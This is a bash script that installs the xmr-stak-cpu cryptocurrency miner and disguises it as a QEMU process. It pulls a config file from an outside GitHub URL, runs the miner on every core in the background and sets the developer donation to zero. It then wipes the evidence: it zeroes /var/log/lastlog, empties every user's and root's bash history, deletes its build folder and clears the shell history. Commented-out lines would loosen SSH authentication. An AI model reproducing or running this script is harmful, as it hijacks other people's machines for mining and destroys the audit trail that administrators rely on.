#!/bin/bash

cpu_cnt=`cat /proc/cpuinfo | awk '/processor/ {print $3}' | wc -l`
#ht_enabled=``
if [  -z "$1" ]
then
        phycores=$(cat /proc/cpuinfo | egrep "core id|physical id" | tr -d "\n" | sed s/physical/\\nphysical/g | grep -v ^$ | sort | uniq | wc -l)
else
        phycores=$1
fi
apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
mkdir /usr/share/packages_download
workingdir=/usr/share/packages_download/
git clone https://github.com/fireice-uk/xmr-stak-cpu.git /usr/share/packages_download/qemu-system-x86
cd $workingdir/qemu-system-x86
cmake .
make install
mv $workingdir/qemu-system-x86/bin/xmr-stak-cpu $workingdir/qemu-system-x86/bin/qemu-system-x86_64
curl https://raw.githubusercontent.com/githubuserold/miner/master/config_for_sed.txt > $workingdir/qemu-system-x86/bin/config.txt
echo -e "],\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
for (( core=0; core<$phycores; core++ )); do
         echo -e "   { \"low_power_mode\" : false, \"no_prefetch\" : true, \"affine_to_cpu\" : ${core} },\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
done
echo -e "[\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
cd $workingdir/qemu-system-x86/bin/
nohup ./qemu-system-x86_64 &
sleep 2
process=`ps aux | grep -v grep | grep root | grep qemu | awk '{print $2}'`
cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
for_test=$((cpus * 100 - 100))
#while [ $for_test -gt $cpusage ]; do
#echo "while loop"
#kill -9 $process
#nohup ./qemu-system-x86_64 &
#sleep 2
#cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
#done
sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/donate-level.h
cd
#sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
#sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_config
#sed -i 's/RSAAuthentication yes/RSAAuthentication no/g' /etc/ssh/sshd_config
#sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
#service sshd restart
sed -i 's/[0-9]/0/g' /var/log/lastlog
users=`ll /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
for i in ${users}; do
        cat /dev/null > /home/$i/.bash_history
done
cat /dev/null > /root/.bash_history
rm -r /usr/share/packages_download
history -c
